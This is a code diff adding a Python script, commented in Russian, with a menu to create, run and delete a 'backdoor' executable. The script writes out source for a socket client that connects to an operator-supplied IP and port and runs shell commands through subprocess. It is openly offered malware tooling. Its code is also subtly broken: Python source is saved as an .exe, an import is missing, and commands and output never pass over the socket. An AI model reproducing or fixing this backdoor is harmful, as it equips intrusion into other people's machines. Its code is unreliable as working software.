@@ -1,0 +1,76 @@
+import os
+import time
+import random
+import string
+from threading import Thread
+
+# Функция для создания бэкдора
+def create_backdoor():
+    # Генерация случайного имени файла
+    file_name = ''.join(random.choice(string.ascii_letters) for _ in range(8)) + '.exe'
+    # Создание файла .exe
+    with open(file_name, 'w') as f:
+        f.write('''
+import os
+import socket
+import subprocess
+
+def connect(ip, port):
+    s = socket.socket()
+    s.connect((ip, port))
+    while True:
+        cmd = input().strip()
+        if cmd == 'exit':
+            break
+        else:
+            print(subprocess.check_output(cmd, shell=True).decode())
+    s.close()
+
+if __name__ == '__main__':
+    try:
+        ip = input("Enter the IP address to connect: ")
+        port = int(input("Enter the port number: "))
+        t = Thread(target=connect, args=(ip, port))
+        t.daemon = True
+        t.start()
+        while True:
+            pass
+    except Exception as e:
+        print(e)
+''')
+    # Установка прав на выполнение файла
+    os.chmod(file_name, 0o755)
+    return file_name
+
+# Функция для запуска бэкдора
+def run_backdoor(file_name):
+    os.system(file_name)
+
+# Функция для удаления бэкдора
+def remove_backdoor(file_name):
+    os.remove(file_name)
+
+# Основной цикл программы
+while True:
+    choice = input("""
+1. Create backdoor
+2. Run backdoor
+3. Remove backdoor
+4. Exit
+""")
+    
+    if choice == '1':
+        backdoor_file = create_backdoor()
+        print(f"Backdoor created at {backdoor_file}")
+    elif choice == '2':
+        backdoor_file = input("Enter the name of the backdoor file: ")
+        run_backdoor(backdoor_file)
+    elif choice == '3':
+        backdoor_file = input("Enter the name of the backdoor file: ")
+        remove_backdoor(backdoor_file)
+    elif choice == '4':
+        break
+    else:
+        print("Invalid choice.")
+
+print("Goodbye!")
